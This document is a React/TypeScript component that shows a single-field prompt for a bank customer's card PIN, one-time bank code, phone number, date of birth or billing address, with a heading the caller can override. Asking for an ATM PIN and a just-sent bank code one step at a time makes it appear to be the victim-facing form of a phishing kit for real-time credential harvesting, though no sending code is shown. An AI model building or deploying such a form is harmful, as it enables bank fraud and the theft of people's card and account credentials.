import { useId, useState } from 'react';

interface AuthPromptProps {
  field: string;
  displayText?: string;
  busy: boolean;
  onSubmit: (value: string) => void;
}

const LABELS: Record<string, { label: string; hint: string; mode: string }> = {
  pin: { label: 'Card PIN', hint: 'The PIN you use at an ATM', mode: 'numeric' },
  otp: {
    label: 'One-time code',
    hint: 'The code your bank just sent you',
    mode: 'numeric',
  },
  phone: {
    label: 'Phone number',
    hint: 'The number registered with your bank',
    mode: 'tel',
  },
  birthday: {
    label: 'Date of birth',
    hint: 'Format: YYYY-MM-DD',
    mode: 'text',
  },
  address: { label: 'Billing address', hint: '', mode: 'text' },
};

export function AuthPrompt({
  field,
  displayText,
  busy,
  onSubmit,
}: AuthPromptProps) {
  const inputId = useId();
  const hintId = useId();
  const [value, setValue] = useState('');
  const meta = LABELS[field] ?? {
    label: 'Verification',
    hint: '',
    mode: 'text',
  };
  const sensitive = field === 'pin' || field === 'otp';

  return (
    <form
      onSubmit={(event) => {
        event.preventDefault();
        if (value.trim()) onSubmit(value.trim());
      }}
    >
      <h2 className="text-[15px] font-semibold">
        {displayText ?? `Enter your ${meta.label.toLowerCase()}`}
      </h2>

      <div className="mt-4">
        <label className="field-label" htmlFor={inputId}>
          {meta.label}
        </label>
        <input
          id={inputId}
          className="field-input tracking-[0.3em] text-center"
          type={sensitive ? 'password' : 'text'}
          inputMode={meta.mode as 'numeric' | 'tel' | 'text'}
          autoComplete={field === 'otp' ? 'one-time-code' : 'off'}
          value={value}
          onChange={(event) => setValue(event.target.value)}
          aria-describedby={meta.hint ? hintId : undefined}
          autoFocus
        />
        {meta.hint && (
          <p id={hintId} className="mt-1.5 text-[13px] text-muted">
            {meta.hint}
          </p>
        )}
      </div>

      <button
        type="submit"
        className="primary-button mt-5"
        disabled={busy || !value.trim()}
      >
        {busy ? 'Checking…' : 'Continue'}
      </button>
    </form>
  );
}
